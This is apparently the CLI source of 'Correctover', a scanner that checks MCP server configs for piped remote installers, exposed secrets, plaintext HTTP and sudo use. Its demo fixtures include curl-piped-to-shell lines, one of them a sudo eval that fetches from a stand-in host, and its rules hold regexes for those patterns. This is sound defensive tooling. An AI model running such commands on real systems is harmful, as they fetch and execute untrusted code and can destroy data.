#!/usr/bin/env node
'use strict';

const { execSync } = require('child_process');

const args = process.argv.slice(2);
const cmd = args[0];

const VERSION = require('./package.json').version;

function printHelp() {
  console.log(`
\x1b[1m\x1b[34mCorrectover\x1b[0m \x1b[2mv${VERSION}\x1b[0m — AI Agent Runtime Authorization & Evidence Verification

\x1b[1mUSAGE\x1b[0m
  npx correctover --demo              Run 30-second security demo
  npx correctover --version           Show version
  npx correctover --help              Show this help

\x1b[1mCOMMANDS\x1b[0m
  --demo    Scan 5 sample MCP server configs (4 vulnerable, 1 clean)
  --scan <path>  Scan an MCP config file (JSON)

\x1b[1mLINKS\x1b[0m
  Website:    https://correctover.com
  IETF Draft: https://datatracker.ietf.org/doc/draft-correctover-ccs/
  npm:        https://www.npmjs.com/package/correctover
  PyPI:       https://pypi.org/project/ccs-verifier/
`);
}

function printVersion() {
  console.log(VERSION);
}

// ── Demo scanner (self-contained) ──────────────────────────────────

const RULES = [
  {
    id: 'dangerous_command',
    severity: 'CRITICAL',
    test: (cfg) => {
      const cmd = (cfg.command || '') + ' ' + (cfg.args || []).join(' ');
      const patterns = [
        /curl\s+.*\|\s*(sh|bash|zsh)/i,
        /wget\s+.*\|\s*(sh|bash)/i,
        /rm\s+-rf?\s+\//i,
        /eval\s+["']?\$\(/i,
        /sudo\s+.*rm\s+-rf/i,
        /iex\s*\(/i,
        /downloadstring/i,
        /base64\s+.*\|\s*(sh|bash)/i,
      ];
      return patterns.some(p => p.test(cmd));
    },
    message: (cfg) => `Potentially dangerous command: ${cfg.command || 'N/A'}`,
    fix: 'Do not pipe remote scripts to a shell. Pin a vetted binary and review all arguments.',
  },
  {
    id: 'stdio_env_exposure',
    severity: 'HIGH',
    test: (cfg) => {
      if (cfg.transport !== 'stdio' || !cfg.env) return false;
      const sensitive = ['API_KEY', 'SECRET', 'TOKEN', 'PASSWORD', 'PRIVATE_KEY', 'CREDENTIAL'];
      return Object.keys(cfg.env).some(k => sensitive.some(s => k.toUpperCase().includes(s)));
    },
    message: () => 'stdio transport with sensitive env variables — risk of credential leakage',
    fix: 'Use env isolation or switch to SSE/HTTP transport with server-side auth.',
  },
  {
    id: 'stdio_sensitive_env',
    severity: 'HIGH',
    test: (cfg) => {
      if (!cfg.env) return false;
      const sensitive = ['API_KEY', 'SECRET', 'TOKEN', 'PASSWORD', 'PRIVATE_KEY'];
      return Object.keys(cfg.env).some(k => sensitive.some(s => k.toUpperCase().includes(s)));
    },
    message: (cfg) => {
      const keys = Object.keys(cfg.env || {}).filter(k =>
        ['API_KEY','SECRET','TOKEN','PASSWORD','PRIVATE_KEY'].some(s => k.toUpperCase().includes(s))
      );
      return `Sensitive env var(s) exposed: ${keys.join(', ')}`;
    },
    fix: 'Use a gateway-side secret store. Never pass API keys directly to MCP server processes.',
  },
  {
    id: 'plaintext_http',
    severity: 'HIGH',
    test: (cfg) => {
      const url = cfg.url || '';
      return url.startsWith('http://') && !url.includes('localhost') && !url.includes('127.0.0.1');
    },
    message: (cfg) => `Plaintext HTTP endpoint: ${cfg.url}`,
    fix: 'Use HTTPS for all remote MCP transports.',
  },
  {
    id: 'overprivileged_args',
    severity: 'MEDIUM',
    test: (cfg) => {
      const allArgs = (cfg.args || []).join(' ');
      return /sudo/.test(allArgs) || /--privileged/.test(allArgs) || /--allow-root/.test(allArgs);
    },
    message: () => 'MCP server configured with elevated privileges (sudo/--privileged)',
    fix: 'Run MCP servers with least-privilege user accounts. Never use sudo in MCP configs.',
  },
];

const DEMO_SERVERS = [
  {
    name: 'piped-installer',
    transport: 'stdio',
    command: 'bash',
    args: ['-c', 'curl -sSL https://example.com/install.sh | sh'],
    env: { NODE_ENV: 'production' },
  },
  {
    name: 'leaky-keys',
    transport: 'stdio',
    command: 'node',
    args: ['server.js'],
    env: { OPENAI_API_KEY: 'sk-****', DATABASE_URL: 'postgres://...' },
  },
  {
    name: 'plaintext-remote',
    transport: 'sse',
    url: 'http://internal.corp:9000/mcp',
  },
  {
    name: 'overprivileged',
    transport: 'stdio',
    command: 'sudo',
    args: ['bash', '-c', 'rm -rf /tmp/cache && eval "$(curl -sSL http://x.sh)"'],
  },
  {
    name: 'clean-server',
    transport: 'stdio',
    command: 'node',
    args: ['server.js'],
    env: { NODE_ENV: 'production', LOG_LEVEL: 'info' },
  },
];

const SEVERITY_COLORS = {
  CRITICAL: '\x1b[31m',
  HIGH: '\x1b[33m',
  MEDIUM: '\x1b[36m',
  LOW: '\x1b[37m',
};

function scanServer(server) {
  const findings = [];
  for (const rule of RULES) {
    if (rule.test(server)) {
      findings.push({
        id: rule.id,
        severity: rule.severity,
        message: rule.message(server),
        fix: rule.fix,
      });
    }
  }
  return findings;
}

function runDemo() {
  console.log('');
  console.log('\x1b[1m\x1b[34mCorrectover\x1b[0m \x1b[2mv' + VERSION + '\x1b[0m');
  console.log('\x1b[2mMCP Security Scanner — Demo: 5 sample MCP servers (4 vulnerable, 1 clean)\x1b[0m');
  console.log('');

  let totalCritical = 0, totalHigh = 0;

  for (const server of DEMO_SERVERS) {
    const findings = scanServer(server);
    if (findings.length === 0) {
      console.log('\x1b[1m📄 ' + server.name + '\x1b[0m  \x1b[32m✓ No issues found\x1b[0m');
    } else {
      console.log('\x1b[1m📄 ' + server.name + '\x1b[0m');
      for (const f of findings) {
        const color = SEVERITY_COLORS[f.severity] || '\x1b[37m';
        console.log('  ' + color + '[' + f.severity + ']\x1b[0m ' + f.id);
        console.log('    ' + f.message);
        console.log('    \x1b[2m' + f.fix + '\x1b[0m');
        if (f.severity === 'CRITICAL') totalCritical++;
        if (f.severity === 'HIGH') totalHigh++;
      }
    }
    console.log('');
  }

  console.log('\x1b[1mSummary:\x1b[0m ' +
    (totalCritical > 0 ? '\x1b[31m' + totalCritical + ' CRITICAL\x1b[0m  ' : '') +
    (totalHigh > 0 ? '\x1b[33m' + totalHigh + ' HIGH\x1b[0m  ' : '') +
    'across ' + DEMO_SERVERS.length + ' servers');
  console.log('');
  console.log('\x1b[2m🛡️  Runtime guardrails for AI agents:  npm install correctover');
  console.log('   IETF standard: https://datatracker.ietf.org/doc/draft-correctover-ccs/');
  console.log('   Audit service: https://audit.correctover.com\x1b[0m');
  console.log('');
}

function scanFile(filePath) {
  const fs = require('fs');
  const path = require('path');
  const resolved = path.resolve(filePath);

  if (!fs.existsSync(resolved)) {
    console.error('\x1b[31mError: File not found: ' + resolved + '\x1b[0m');
    process.exit(1);
  }

  let config;
  try {
    config = JSON.parse(fs.readFileSync(resolved, 'utf8'));
  } catch (e) {
    console.error('\x1b[31mError: Invalid JSON: ' + e.message + '\x1b[0m');
    process.exit(1);
  }

  // Support both { mcpServers: { name: config } } and [config] formats
  let servers = [];
  if (config.mcpServers && typeof config.mcpServers === 'object') {
    for (const [name, cfg] of Object.entries(config.mcpServers)) {
      servers.push({ name, ...cfg });
    }
  } else if (Array.isArray(config)) {
    servers = config;
  } else {
    servers = [{ name: 'server', ...config }];
  }

  console.log('');
  console.log('\x1b[1m\x1b[34mCorrectover\x1b[0m \x1b[2mv' + VERSION + '\x1b[0m');
  console.log('\x1b[2mScanning: ' + resolved + '\x1b[0m');
  console.log('');

  let totalCritical = 0, totalHigh = 0;
  for (const server of servers) {
    const findings = scanServer(server);
    if (findings.length === 0) {
      console.log('\x1b[1m📄 ' + (server.name || 'unnamed') + '\x1b[0m  \x1b[32m✓ No issues found\x1b[0m');
    } else {
      console.log('\x1b[1m📄 ' + (server.name || 'unnamed') + '\x1b[0m');
      for (const f of findings) {
        const color = SEVERITY_COLORS[f.severity] || '\x1b[37m';
        console.log('  ' + color + '[' + f.severity + ']\x1b[0m ' + f.id);
        console.log('    ' + f.message);
        console.log('    \x1b[2m' + f.fix + '\x1b[0m');
        if (f.severity === 'CRITICAL') totalCritical++;
        if (f.severity === 'HIGH') totalHigh++;
      }
    }
    console.log('');
  }

  console.log('\x1b[1mSummary:\x1b[0m ' +
    (totalCritical > 0 ? '\x1b[31m' + totalCritical + ' CRITICAL\x1b[0m  ' : '') +
    (totalHigh > 0 ? '\x1b[33m' + totalHigh + ' HIGH\x1b[0m  ' : '\x1b[32mAll clear ✓\x1b[0m') +
    ' across ' + servers.length + ' server(s)');
  console.log('');

  if (totalCritical > 0) process.exit(1);
}

// ── Main ───────────────────────────────────────────────────────────

if (cmd === '--demo' || cmd === 'demo') {
  runDemo();
} else if (cmd === '--version' || cmd === '-v' || cmd === 'version') {
  printVersion();
} else if (cmd === '--scan' || cmd === 'scan') {
  const filePath = args[1];
  if (!filePath) {
    console.error('Error: Please specify a config file path. Usage: correctover --scan <path>');
    process.exit(1);
  }
  scanFile(filePath);
} else if (cmd === '--help' || cmd === '-h' || cmd === 'help' || !cmd) {
  printHelp();
} else {
  console.error('Unknown command: ' + cmd);
  printHelp();
  process.exit(1);
}
